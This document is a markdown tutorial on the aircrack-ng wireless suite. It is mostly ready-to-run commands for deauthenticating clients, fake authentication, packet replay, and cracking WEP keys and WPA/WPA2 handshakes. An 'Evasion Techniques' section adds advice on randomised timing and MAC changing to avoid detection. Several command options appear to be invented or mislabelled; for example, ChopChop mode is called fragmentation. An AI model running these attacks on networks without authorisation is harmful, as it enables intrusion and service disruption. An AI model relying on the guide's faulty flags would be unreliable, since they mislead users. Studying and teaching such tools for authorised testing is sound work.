# Aircrack-ng Fundamentals

**Objective**: Deep dive into aircrack-ng suite architecture, tool capabilities, and professional wireless security testing methodology.

---

## 🏗️ Architecture Overview

### **Tool Suite Components**

```
aircrack-ng Suite
├── Core Tools
│   ├── airmon-ng      # Monitor mode management
│   ├── airodump-ng    # Packet capture and analysis
│   ├── aireplay-ng    # Packet injection attacks
│   └── aircrack-ng    # Password cracking engine
├── Utility Tools
│   ├── airdecap-ng    # Packet decryption
│   ├── airolib-ng     # Rainbow table management
│   ├── airserv-ng     # Remote access server
│   └── airtun-ng      # Virtual tunnel creation
└── Specialized Tools
    ├── airbase-ng     # Fake AP creation
    ├── packetforge-ng # Custom packet generation
    ├── wesside-ng     # Automated WEP cracking
    └── easside-ng     # WEP key recovery
```

---

## 🔧 Tool Deep Dive

### **airmon-ng - Monitor Mode Management**

**Purpose**: Manages wireless interfaces and enables monitor mode for packet capture and injection.

**Key Features**:
- Interface enumeration and status checking
- Monitor mode activation/deactivation
- Conflicting process detection and termination
- Driver compatibility verification

**Advanced Usage**:
```bash
# Check interface capabilities
airmon-ng check wlan0

# Start with specific channel and MAC
airmon-ng start wlan0 6 00:11:22:33:44:55

# Start with custom interface name
airmon-ng start wlan0 --name custom_mon

# Check for interfering processes
airmon-ng check

# Kill all interfering processes
airmon-ng check kill
```

**Common Issues**:
- Network manager conflicts
- Driver incompatibility
- USB power limitations
- Kernel module problems

### **airodump-ng - Packet Capture Engine**

**Purpose**: Captures and analyzes wireless packets, providing real-time network discovery and monitoring.

**Key Features**:
- Multi-channel scanning with hopping
- Real-time network statistics
- Client association tracking
- Handshake capture detection
- Multiple output formats

**Advanced Techniques**:
```bash
# Channel hopping with custom interval
airodump-ng --hop-interval 250 wlan0mon

# Capture with GPS coordinates
airodump-ng --gpsd wlan0mon

# Background capture with rotation
airodump-ng --write-interval 60 -w rotating wlan0mon

# Capture with custom OUI resolution
airodump-ng --manufacturer wlan0mon

# Filter by signal strength
airodump-ng --min-signal -50 wlan0mon
```

**Output Formats**:
- **CSV**: Machine-readable format
- **NetXML**: XML-based format
- **KISMET**: Kismet-compatible format
- **CAP**: Standard packet capture format

### **aireplay-ng - Packet Injection Framework**

**Purpose**: Injects custom packets into wireless networks for testing and attack purposes.

**Attack Types**:
1. **Deauthentication (Mode 0)**
2. **Fake Authentication (Mode 1)**
3. **Interactive Replay (Mode 2)**
4. **ARP Request Replay (Mode 3)**
5. **ChopChop Attack (Mode 4)**
6. **Fragmentation Attack (Mode 5)**
7. **Caffe-Latte Attack (Mode 6)**
8. **Client-to-Client (Mode 7)**
9. **WPA Migration (Mode 8)**
10. **Injection Test (Mode 9)**

**Advanced Injection**:
```bash
# Injection with custom timing
aireplay-ng -0 5 -a 00:11:22:33:44:55 --delay 1000 wlan0mon

# Injection with specific reason codes
aireplay-ng -0 5 -a 00:11:22:33:44:55 --reason 7 wlan0mon

# Packet replay from file
aireplay-ng -2 -r captured.cap wlan0mon

# Fragment size manipulation
aireplay-ng -4 -f 1500 -b 00:11:22:33:44:55 wlan0mon
```

### **aircrack-ng - Password Cracking Engine**

**Purpose**: Recovers WEP keys and cracks WPA/WPA2 passwords using various attack methods.

**Cracking Methods**:
- **Statistical Analysis**: FMS, KoreK, PTW attacks for WEP
- **Dictionary Attacks**: Wordlist-based WPA/WPA2 cracking
- **Brute Force**: Systematic password generation
- **Rainbow Tables**: Pre-computed hash lookups

**Advanced Cracking**:
```bash
# Multi-threaded cracking
aircrack-ng -w wordlist.txt -p 8 handshake.cap

# Session management
aircrack-ng -w wordlist.txt -s session.txt handshake.cap

# Specific BSSID targeting
aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 handshake.cap

# Combined capture files
aircrack-ng -w wordlist.txt capture*.cap
```

---

## 🔬 Attack Methodologies

### **WEP Cracking Methodology**

**Step 1: Reconnaissance**
```bash
# Discover WEP networks
airodump-ng wlan0mon

# Target specific network
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wep_target wlan0mon
```

**Step 2: Authentication**
```bash
# Fake authentication
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# Verify authentication
aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 00:11:22:33:44:66 -e "NetworkName" wlan0mon
```

**Step 3: Traffic Generation**
```bash
# ARP request replay
aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon

# Interactive packet replay
aireplay-ng -2 -b 00:11:22:33:44:55 -h 00:11:22:33:44:66 wlan0mon
```

**Step 4: Key Recovery**
```bash
# Statistical analysis
aircrack-ng wep_target.cap

# Specific key length
aircrack-ng -n 128 wep_target.cap
```

### **WPA/WPA2 Cracking Methodology**

**Step 1: Handshake Capture**
```bash
# Monitor target network
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w wpa_target wlan0mon

# Force client reconnection
aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon
```

**Step 2: Handshake Verification**
```bash
# Verify handshake capture
aircrack-ng wpa_target.cap

# Check for specific BSSID
aircrack-ng -b 00:11:22:33:44:55 wpa_target.cap
```

**Step 3: Password Cracking**
```bash
# Dictionary attack
aircrack-ng -w wordlist.txt wpa_target.cap

# Combined wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt wpa_target.cap
```

---

## 📊 Performance Optimization

### **Capture Optimization**

**Memory Management**:
```bash
# Limit capture file size
airodump-ng --write-interval 60 -w rotating wlan0mon

# Target specific channels
airodump-ng -c 1,6,11 wlan0mon

# Reduce output verbosity
airodump-ng --quiet wlan0mon
```

**CPU Optimization**:
```bash
# Limit channel hopping
airodump-ng --hop-interval 1000 wlan0mon

# Disable manufacturer lookup
airodump-ng --no-manufacturer wlan0mon

# Use specific output format
airodump-ng --output-format csv wlan0mon
```

### **Cracking Optimization**

**Threading**:
```bash
# Utilize multiple CPU cores
aircrack-ng -w wordlist.txt -p 8 handshake.cap

# Optimize thread count
aircrack-ng -w wordlist.txt -p $(nproc) handshake.cap
```

**Wordlist Management**:
```bash
# Sort wordlist by frequency
sort wordlist.txt | uniq -c | sort -nr | awk '{print $2}' > optimized.txt

# Filter wordlist by length
awk 'length($0) >= 8 && length($0) <= 63' wordlist.txt > filtered.txt
```

---

## 🛡️ Evasion Techniques

### **Traffic Obfuscation**

**Timing Manipulation**:
```bash
# Random delays
aireplay-ng -0 5 -a 00:11:22:33:44:55 --delay $((RANDOM % 1000)) wlan0mon

# Spread attacks over time
for i in {1..10}; do
    aireplay-ng -0 1 -a 00:11:22:33:44:55 wlan0mon
    sleep $((RANDOM % 30))
done
```

**MAC Address Randomization**:
```bash
# Change MAC before starting
macchanger -r wlan0mon

# Use different MAC for each attack
macchanger -m 00:11:22:33:44:$(printf '%02x' $((RANDOM % 256))) wlan0mon
```

**Packet Fragmentation**:
```bash
# Fragment injection packets
aireplay-ng -4 -f 1500 -b 00:11:22:33:44:55 wlan0mon

# Custom fragment sizes
aireplay-ng -4 -f 576 -b 00:11:22:33:44:55 wlan0mon
```

---

## 🔍 Troubleshooting Guide

### **Interface Issues**

**Driver Problems**:
```bash
# Check driver status
lsmod | grep -i wireless

# Reload driver
modprobe -r rtl8812au
modprobe rtl8812au

# Check dmesg for errors
dmesg | grep -i wireless
```

**Permission Issues**:
```bash
# Add user to appropriate groups
sudo usermod -a -G netdev $USER

# Check interface permissions
ls -la /sys/class/net/wlan0mon/

# Use sudo for root privileges
sudo airmon-ng start wlan0
```

### **Capture Issues**

**No Packets Captured**:
```bash
# Verify monitor mode
iwconfig wlan0mon

# Check channel settings
iwconfig wlan0mon channel 6

# Verify interface is up
ifconfig wlan0mon up
```

**Injection Failures**:
```bash
# Test injection capability
aireplay-ng -9 wlan0mon

# Check for firmware issues
dmesg | grep -i firmware

# Try different injection modes
aireplay-ng -9 -D wlan0mon
```

### **Cracking Issues**

**No Handshake Detected**:
```bash
# Verify file integrity
file handshake.cap

# Check for handshake manually
aircrack-ng handshake.cap

# Use different deauth counts
aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon
```

**Slow Cracking Speed**:
```bash
# Optimize wordlist
sort wordlist.txt | uniq > optimized.txt

# Use multiple threads
aircrack-ng -w wordlist.txt -p $(nproc) handshake.cap

# Check system resources
top -p $(pgrep aircrack-ng)
```

---

## 📚 Best Practices

### **Operational Security**

**Documentation**:
- Maintain detailed testing logs
- Document all commands and parameters
- Record timing and success rates
- Keep evidence chain of custody

**Legal Compliance**:
- Obtain written authorization
- Define testing scope clearly
- Respect privacy boundaries
- Follow disclosure procedures

### **Technical Excellence**

**Systematic Approach**:
1. Reconnaissance phase
2. Vulnerability assessment
3. Exploitation testing
4. Impact analysis
5. Remediation recommendations

**Quality Assurance**:
- Verify all results independently
- Use multiple attack vectors
- Validate findings with different tools
- Document limitations and assumptions

---

*Master the fundamentals to excel in advanced wireless security testing*
